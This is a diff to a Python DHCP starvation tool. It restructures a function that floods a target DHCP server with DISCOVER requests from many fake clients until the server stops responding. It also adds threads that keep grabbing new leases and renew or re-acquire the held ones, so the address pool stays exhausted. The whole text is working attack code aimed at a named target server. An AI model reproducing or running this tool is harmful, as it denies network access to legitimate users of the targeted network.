@@ -15,56 +15,65 @@ def starvation(presist : bool  ,  iface : str  , target: str )-> None :
               		-t TARGET, --target TARGET IP of target server
 	'''
  
-	threads =[ ]
+
 	clients = [] 
-	def mantain (clients) :  
+
+	def push(clients):
+		while(1):
+			time.sleep(0.5)
+			clt = DHCPClient()
+			clt.mantian = True
+			clt.discover().join()
+			if clt.valid():
+				clients.append(clt)
+ 
+	def mantain (clients) : 
 		while(1):
 			for index,client in enumerate(clients): 
-				if client.time and client.stat == DHCPStatus.MANTIN0 and client.time * 0.5 <= time.time() - client.curTime  :
-					print(f"{client.stat}  client {client.name}\{client.time-time.time():.0f}\{client.ip}")
+			
+				if client.time and client.stat == DHCPStatus.MANTAIN0 and client.time * 0.5 <= time.time() - client.curTime or  client.time and client.stat == DHCPStatus.MANTAIN50 and client.time * 0.875  <=  time.time()  - client.curTime:
 					client.re_requestyou()
-				if client.time and client.stat == DHCPStatus.MANTAIN50 and client.time * 0.875  <=  time.time()  - client.curTime :
-					print(f"{client.stat}  client {client.name}\{client.time-time.time():.0f}\{client.ip}")
-					client.re_requestyou()
+					print(f"{client.stat}  client {client.name}\{time.time()-client.curTime:.0f}\{client.ip}")
 				if client.time and client.stat == DHCPStatus.MANTAIN87 and client.time   <=  time.time()  - client.curTime :
-					
-					client.to_trash()
-					clients[index]= DHCPClient()
-					clients[index].discover()
-					print(f"""{client.stat} -> {clients[index].stat} 
-           						name {client.name} ->  { clients[index].name}
-           						mac {client.mac} ->  {clients[index].mac}		""")
+					client.to_trash().join()
+					time.sleep(0.1)
+					print(f"""{client.stat} -{client.name} reconnect""")
+			
 
 
 	
-
-
-
 	presistT = Thread (target = mantain ,args = (clients,)) if presist else  None
-	DHCPClient.reset() 
+	push = Thread (target = push  ,args = (clients,)) if presist else  None
+ 
+ 
+
+	def starv(clients):
+		threads =[ ]
+		DHCPClient.reset()
+		while(DHCPClient.aborted == -1 ):
+			client = DHCPClient()
+			threads.append(client.discover())
+			clients.append(client)
+
+
+		for thread in threads : 
+			if thread : 
+				thread.join()
+		print(f"ended starvation aborted :  {DHCPClient.aborted } " ) 
+		clients = list(filter(lambda client : client.valid() , clients ) ) 
+		if not clients:
+			sys.exit(-1)
+		clients.sort(key=lambda client  : client.ip ) 
+		for client in clients : 
+			print(f"client {client.name}\{time.time()-client.curTime:.0f}\{client.ip}")
+   
 	if presist : 
 		presistT.start()
-	while(DHCPClient.aborted == -1 ):
-		client = DHCPClient()
-		threads.append(client.discover())
-		clients.append(client)
-
-
-	for thread in threads : 
-		if thread : 
-			thread.join()
-
-	print(f"ended starvation aborted :  {DHCPClient.aborted } " ) 
-	clients = list(filter(lambda client : client.ip != "0.0.0.0" , clients ) ) 
-	if not clients:
-		sys.exit(-1)
-	clients.sort(key=lambda client  : client.ip ) 
-	for client in clients : 
-		print(f"client {client.name}\{client.time-time.time():.0f}\{client.ip}")
+		push.start()
+	starv(clients)
 	if presist : 
 		presistT.join()
-
- 
+		push.join()
 	
 
 helpStr = starvation.__doc__
